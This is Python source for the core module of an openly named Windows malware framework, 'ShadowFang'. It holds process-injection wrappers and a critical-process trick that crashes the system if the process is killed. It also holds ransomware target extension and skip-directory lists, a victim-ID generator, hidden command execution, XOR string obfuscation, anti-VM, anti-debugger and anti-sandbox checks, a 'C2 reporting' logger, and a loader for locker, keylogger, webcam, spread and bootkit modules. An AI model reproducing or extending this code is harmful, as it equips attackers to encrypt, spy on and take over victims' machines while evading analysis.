#!/usr/bin/env python3
"""
SHADOWFANG CORE PACKAGE INITIALIZER
Initializes core modules, provides shared utilities, Windows API bindings
All other core modules import from this file
"""

import os
import sys
import time
import ctypes
import hashlib
import threading
import subprocess
from datetime import datetime
from ctypes import wintypes
from ctypes import windll

# ==================== VERSION ====================

__version__ = "2.0.0"
__author__ = "ShadowFang"
__build_date__ = datetime.now().strftime("%Y-%m-%d")
__target__ = "Windows 7/8/10/11 - x64 & x86"

# ==================== WINDOWS API BINDINGS ====================

class WinAPI:
    """Direct Windows API bindings for low-level operations"""
    
    # DLL Handles
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    advapi32 = ctypes.windll.advapi32
    ntdll = ctypes.windll.ntdll
    shell32 = ctypes.windll.shell32
    gdi32 = ctypes.windll.gdi32
    
    # Function prototypes
    @staticmethod
    def get_current_process_id():
        """Get current process ID"""
        return WinAPI.kernel32.GetCurrentProcessId()
    
    @staticmethod
    def get_current_process_handle():
        """Get current process handle"""
        return WinAPI.kernel32.GetCurrentProcess()
    
    @staticmethod
    def open_process(process_id, access=0x1F0FFF):
        """Open process with full access"""
        return WinAPI.kernel32.OpenProcess(access, False, process_id)
    
    @staticmethod
    def virtual_alloc_ex(process_handle, size, allocation_type=0x3000, protect=0x40):
        """Allocate memory in remote process"""
        return WinAPI.kernel32.VirtualAllocEx(
            process_handle, None, size, allocation_type, protect
        )
    
    @staticmethod
    def virtual_protect(address, size, new_protect=0x40):
        """Change memory protection"""
        old_protect = wintypes.DWORD(0)
        WinAPI.kernel32.VirtualProtect(
            address, size, new_protect, ctypes.byref(old_protect)
        )
        return old_protect.value
    
    @staticmethod
    def write_process_memory(process_handle, address, data):
        """Write data to remote process memory"""
        written = ctypes.c_size_t(0)
        buffer = ctypes.create_string_buffer(data)
        WinAPI.kernel32.WriteProcessMemory(
            process_handle, address, buffer, len(data), ctypes.byref(written)
        )
        return written.value
    
    @staticmethod
    def create_remote_thread(process_handle, start_address, parameter=None):
        """Create thread in remote process"""
        thread_id = wintypes.DWORD(0)
        thread_handle = WinAPI.kernel32.CreateRemoteThread(
            process_handle, None, 0, start_address, parameter, 0, ctypes.byref(thread_id)
        )
        return thread_handle, thread_id.value
    
    @staticmethod
    def get_tick_count():
        """Get system uptime in milliseconds"""
        return WinAPI.kernel32.GetTickCount64()
    
    @staticmethod
    def is_debugger_present():
        """Check if debugger is attached"""
        return WinAPI.kernel32.IsDebuggerPresent() == 1
    
    @staticmethod
    def set_process_critical():
        """Set process as critical - BSOD if killed"""
        try:
            process_handle = WinAPI.get_current_process_handle()
            WinAPI.ntdll.RtlSetProcessIsCritical(1, None, 0)
            return True
        except:
            return False
    
    @staticmethod
    def block_input(block=True):
        """Block or unblock keyboard/mouse input"""
        return WinAPI.user32.BlockInput(block)
    
    @staticmethod
    def show_window(hwnd, command=0):
        """Show/hide window"""
        return WinAPI.user32.ShowWindow(hwnd, command)
    
    @staticmethod
    def get_foreground_window():
        """Get foreground window handle"""
        return WinAPI.user32.GetForegroundWindow()
    
    @staticmethod
    def set_window_pos(hwnd, hwnd_insert_after, x, y, cx, cy, flags):
        """Set window position"""
        return WinAPI.user32.SetWindowPos(
            hwnd, hwnd_insert_after, x, y, cx, cy, flags
        )
    
    @staticmethod
    def message_box(title, message, flags=0x10):
        """Show message box"""
        return WinAPI.user32.MessageBoxW(None, message, title, flags)
    
    @staticmethod
    def get_volume_information(drive):
        """Get drive volume information"""
        volume_name = ctypes.create_unicode_buffer(261)
        volume_serial = wintypes.DWORD(0)
        max_component = wintypes.DWORD(0)
        fs_flags = wintypes.DWORD(0)
        fs_name = ctypes.create_unicode_buffer(261)
        
        WinAPI.kernel32.GetVolumeInformationW(
            drive, volume_name, 261, ctypes.byref(volume_serial),
            ctypes.byref(max_component), ctypes.byref(fs_flags),
            fs_name, 261
        )
        return volume_name.value, volume_serial.value, fs_name.value
    
    @staticmethod
    def get_drive_type(drive):
        """Get drive type (fixed, removable, network, etc.)"""
        return WinAPI.kernel32.GetDriveTypeW(drive)
    
    @staticmethod
    def get_logical_drives():
        """Get all logical drives"""
        bitmask = WinAPI.kernel32.GetLogicalDrives()
        drives = []
        for i in range(26):
            if bitmask & (1 << i):
                drives.append(chr(65 + i) + ':\\')
        return drives
    
    @staticmethod
    def registry_create_key(hkey, subkey):
        """Create registry key"""
        import winreg
        return winreg.CreateKey(hkey, subkey)
    
    @staticmethod
    def registry_set_value(key, name, value_type, value):
        """Set registry value"""
        import winreg
        winreg.SetValueEx(key, name, 0, value_type, value)
    
    @staticmethod
    def registry_delete_key(hkey, subkey):
        """Delete registry key"""
        import winreg
        winreg.DeleteKey(hkey, subkey)

# ==================== CORE CONSTANTS ====================

class Constants:
    """Centralized constants"""
    
    # Encryption
    AES_KEY_SIZE = 32
    AES_IV_SIZE = 16
    RSA_KEY_SIZE = 2048
    CHUNK_SIZE = 65536
    
    # Registry Hives
    HKEY_CURRENT_USER = 0x80000001
    HKEY_LOCAL_MACHINE = 0x80000002
    HKEY_CLASSES_ROOT = 0x80000000
    HKEY_USERS = 0x80000003
    
    # Registry Types
    REG_SZ = 1
    REG_DWORD = 4
    REG_BINARY = 3
    REG_MULTI_SZ = 7
    
    # Process Access Rights
    PROCESS_ALL_ACCESS = 0x1F0FFF
    PROCESS_CREATE_THREAD = 0x0002
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_WRITE = 0x0020
    PROCESS_QUERY_INFORMATION = 0x0400
    
    # Memory Protection
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE = 0x10
    
    # Memory Allocation
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_RELEASE = 0x8000
    
    # Window Constants
    SW_HIDE = 0
    SW_SHOW = 5
    HWND_TOPMOST = -1
    HWND_TOP = 0
    SWP_NOMOVE = 0x0002
    SWP_NOSIZE = 0x0001
    SWP_SHOWWINDOW = 0x0040
    
    # Drive Types
    DRIVE_UNKNOWN = 0
    DRIVE_NO_ROOT_DIR = 1
    DRIVE_REMOVABLE = 2
    DRIVE_FIXED = 3
    DRIVE_REMOTE = 4
    DRIVE_CDROM = 5
    DRIVE_RAMDISK = 6
    
    # File Attributes
    FILE_ATTRIBUTE_HIDDEN = 0x2
    FILE_ATTRIBUTE_SYSTEM = 0x4
    FILE_ATTRIBUTE_ARCHIVE = 0x20
    FILE_ATTRIBUTE_NORMAL = 0x80
    FILE_ATTRIBUTE_TEMPORARY = 0x100
    
    # Process Names
    PROCESS_NAMES = [
        "svchost.exe",
        "winlogon.exe",
        "csrss.exe",
        "lsass.exe",
        "spoolsv.exe",
        "services.exe",
        "dwm.exe",
        "explorer.exe"
    ]
    
    # Service Names
    SERVICE_NAMES = [
        "WindowsUpdate",
        "SecurityHealth",
        "SystemHelper",
        "NetworkService",
        "DeviceManager",
        "AudioService",
        "PrintSpooler"
    ]
    
    # Target Directories to Skip
    SKIP_DIRECTORIES = [
        "Windows",
        "Program Files",
        "Program Files (x86)",
        "$Recycle.Bin",
        "System Volume Information",
        "Recovery",
        "Boot",
        "PerfLogs",
        "MSOCache",
        "Config.Msi"
    ]
    
    # Target Extensions
    TARGET_EXTENSIONS = [
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
        '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv', '.wps',
        '.db', '.sql', '.sqlite', '.mdb', '.accdb', '.dbf',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
        '.mp3', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.iso',
        '.py', '.java', '.cpp', '.c', '.js', '.php', '.html', '.css',
        '.ini', '.cfg', '.conf', '.config', '.yaml', '.yml',
        '.pem', '.key', '.crt', '.cer', '.p12', '.pfx',
        '.vmdk', '.vhd', '.vhdx', '.ova', '.ovf',
        '.bak', '.backup', '.old', '.tmp',
        '.pst', '.ost', '.msg', '.eml',
        '.wallet', '.dat', '.bitcoin',
        '.psd', '.ai', '.indd'
    ]

# ==================== CORE UTILITIES ====================

class CoreUtils:
    """Shared utility functions"""
    
    @staticmethod
    def get_executable_path():
        """Get current executable path"""
        if getattr(sys, 'frozen', False):
            return sys.executable
        return os.path.abspath(sys.argv[0])
    
    @staticmethod
    def is_admin():
        """Check admin privileges"""
        try:
            return WinAPI.shell32.IsUserAnAdmin() == 1
        except:
            return False
    
    @staticmethod
    def is_64bit():
        """Check if 64-bit system"""
        return ctypes.sizeof(ctypes.c_void_p) == 8
    
    @staticmethod
    def get_system_info():
        """Collect system information"""
        import platform
        info = {
            'computer_name': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
            'username': os.environ.get('USERNAME', 'UNKNOWN'),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'architecture': 'x64' if CoreUtils.is_64bit() else 'x86',
            'python_version': sys.version,
            'timestamp': datetime.now().isoformat(),
            'uptime_seconds': WinAPI.get_tick_count() // 1000
        }
        return info
    
    @staticmethod
    def generate_unique_id(prefix=''):
        """Generate unique victim ID"""
        info = CoreUtils.get_system_info()
        raw = f"{info['computer_name']}|{info['username']}|{datetime.now().timestamp()}|{os.urandom(8).hex()}"
        hash_obj = hashlib.sha256(raw.encode())
        unique = hash_obj.hexdigest()[:16].upper()
        return f"{prefix}{unique}" if prefix else unique
    
    @staticmethod
    def safe_execute(func, *args, **kwargs):
        """Safe execution with error handling"""
        try:
            return func(*args, **kwargs)
        except Exception as e:
            return None
    
    @staticmethod
    def run_hidden(command):
        """Run command hidden"""
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            process = subprocess.Popen(
                command,
                shell=True,
                startupinfo=startupinfo,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return process.pid
        except:
            return None
    
    @staticmethod
    def set_high_priority():
        """Set process to high priority"""
        try:
            handle = WinAPI.get_current_process_handle()
            WinAPI.kernel32.SetPriorityClass(handle, 0x00000080)  # HIGH_PRIORITY_CLASS
            return True
        except:
            return False
    
    @staticmethod
    def set_critical_process():
        """Set process critical - BSOD if killed"""
        try:
            return WinAPI.set_process_critical()
        except:
            return False
    
    @staticmethod
    def sleep_with_jitter(base_seconds, jitter_percent=20):
        """Sleep with random jitter to avoid detection"""
        import random
        jitter = base_seconds * (jitter_percent / 100)
        actual_sleep = base_seconds + random.uniform(-jitter, jitter)
        time.sleep(max(0, actual_sleep))
        return actual_sleep
    
    @staticmethod
    def obfuscate_string(s):
        """Simple XOR string obfuscation"""
        key = 0x42
        return ''.join(chr(ord(c) ^ key) for c in s)
    
    @staticmethod
    def deobfuscate_string(s):
        """Deobfuscate XOR string"""
        return CoreUtils.obfuscate_string(s)
    
    @staticmethod
    def get_file_hash(filepath, algorithm='sha256'):
        """Get file hash"""
        hash_obj = hashlib.new(algorithm)
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                hash_obj.update(chunk)
        return hash_obj.hexdigest()
    
    @staticmethod
    def check_vm():
        """Check if running in virtual machine"""
        try:
            # Check common VM indicators
            vm_indicators = [
                'vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v',
                'virtio', 'vbox', 'vmx'
            ]
            
            # Check system model
            import subprocess
            result = subprocess.run(
                ['wmic', 'computersystem', 'get', 'model,manufacturer'],
                capture_output=True, text=True
            )
            output = result.stdout.lower()
            
            for indicator in vm_indicators:
                if indicator in output:
                    return True
            
            # Check uptime (sandboxes often have very low uptime)
            uptime = WinAPI.get_tick_count() // 1000
            if uptime < 300:  # Less than 5 minutes
                return True
            
            return False
        except:
            return False
    
    @staticmethod
    def check_debugger():
        """Check for debugger presence"""
        try:
            if WinAPI.is_debugger_present():
                return True
            
            # Check PEB BeingDebugged flag
            peb = ctypes.cast(
                WinAPI.ntdll.NtCurrentTeb(),
                ctypes.POINTER(ctypes.c_void_p)
            ).contents.value
            
            if peb:
                being_debugged = ctypes.cast(
                    peb + 0x02,
                    ctypes.POINTER(ctypes.c_byte)
                ).contents.value
                
                if being_debugged:
                    return True
            
            return False
        except:
            return False
    
    @staticmethod
    def anti_sandbox():
        """Anti-sandbox checks"""
        try:
            # Check for sandbox artifacts
            sandbox_files = [
                'C:\\agent\\agent.pyw',
                'C:\\sandbox',
                'C:\\cuckoo',
                'C:\\analysis'
            ]
            
            for file in sandbox_files:
                if os.path.exists(file):
                    return True
            
            # Check for common analysis tools
            analysis_processes = [
                'wireshark.exe', 'procmon.exe', 'processhacker.exe',
                'ollydbg.exe', 'x64dbg.exe', 'ida.exe'
            ]
            
            import subprocess
            result = subprocess.run(['tasklist'], capture_output=True, text=True)
            for proc in analysis_processes:
                if proc.lower() in result.stdout.lower():
                    return True
            
            return False
        except:
            return False

# ==================== MODULE LOADER ====================

class ModuleLoader:
    """Dynamic module loading for core components"""
    
    @staticmethod
    def load_module(module_name):
        """Dynamically load a core module"""
        try:
            module = __import__(f'core.{module_name}', fromlist=['*'])
            return module
        except ImportError as e:
            return None
        except Exception as e:
            return None
    
    @staticmethod
    def load_all_modules():
        """Load all core modules"""
        modules = {}
        module_names = [
            'config', 'crypto', 'evasion', 'persistence',
            'network', 'spread', 'locker', 'melt',
            'keylogger', 'screenshot', 'webcam', 'audio',
            'clipboard', 'browser', 'antivirus', 'firewall',
            'bootkit', 'process', 'recovery'
        ]
        
        for name in module_names:
            module = ModuleLoader.load_module(name)
            if module:
                modules[name] = module
        
        return modules
    
    @staticmethod
    def get_available_modules():
        """List available core modules"""
        module_files = os.listdir(os.path.dirname(__file__))
        modules = []
        
        for file in module_files:
            if file.endswith('.py') and file != '__init__.py':
                modules.append(file[:-3])
        
        return modules

# ==================== THREAD MANAGER ====================

class ThreadManager:
    """Manage background threads for various operations"""
    
    def __init__(self):
        self.threads = []
        self.stop_event = threading.Event()
    
    def start_thread(self, target, args=(), daemon=True):
        """Start a new thread"""
        thread = threading.Thread(target=target, args=args)
        thread.daemon = daemon
        thread.start()
        self.threads.append(thread)
        return thread
    
    def stop_all_threads(self):
        """Stop all running threads"""
        self.stop_event.set()
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1)
        self.threads.clear()
    
    def get_active_thread_count(self):
        """Get count of active threads"""
        return len([t for t in self.threads if t.is_alive()])

# ==================== LOGGER ====================

class Logger:
    """Internal logging for debugging and C2 reporting"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._instance.logs = []
                cls._instance.enabled = True
        return cls._instance
    
    def log(self, level, message):
        """Add log entry"""
        if not self.enabled:
            return
        
        entry = {
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message
        }
        self.logs.append(entry)
        
        # Keep only last 1000 logs
        if len(self.logs) > 1000:
            self.logs = self.logs[-1000:]
    
    def info(self, message):
        self.log('INFO', message)
    
    def warning(self, message):
        self.log('WARNING', message)
    
    def error(self, message):
        self.log('ERROR', message)
    
    def critical(self, message):
        self.log('CRITICAL', message)
    
    def get_logs(self, level=None):
        """Get filtered logs"""
        if level:
            return [l for l in self.logs if l['level'] == level]
        return self.logs
    
    def clear(self):
        self.logs.clear()
    
    def export(self, format='json'):
        """Export logs"""
        import json
        if format == 'json':
            return json.dumps(self.logs, indent=2)
        elif format == 'text':
            return '\n'.join([f"[{l['timestamp']}] {l['level']}: {l['message']}" for l in self.logs])

# ==================== GLOBAL INSTANCES ====================

# Create singleton instances
logger = Logger()
thread_manager = ThreadManager()

# ==================== INITIALIZATION ====================

def initialize():
    """Initialize core package"""
    init_start = time.time()
    
    # Log initialization
    logger.info(f"Core package initializing - v{__version__}")
    
    # Set process priority
    CoreUtils.set_high_priority()
    
    # Check environment
    system_info = CoreUtils.get_system_info()
    logger.info(f"System: {system_info['computer_name']} - {system_info['username']}")
    logger.info(f"OS: {system_info['os_release']} - {system_info['architecture']}")
    
    # Check for debugger
    if CoreUtils.check_debugger():
        logger.warning("Debugger detected")
    
    # Check for VM
    if CoreUtils.check_vm():
        logger.warning("Virtual machine detected")
    
    # Log initialization time
    init_time = time.time() - init_start
    logger.info(f"Core initialized in {init_time:.3f}s")
    
    return True

# Auto-initialize on import
if __name__ != '__main__':
    initialize()

# ==================== EXPORT ALL ====================

__all__ = [
    'WinAPI',
    'Constants',
    'CoreUtils',
    'ModuleLoader',
    'ThreadManager',
    'Logger',
    'logger',
    'thread_manager',
    'initialize',
    '__version__',
    '__author__',
    '__build_date__'
]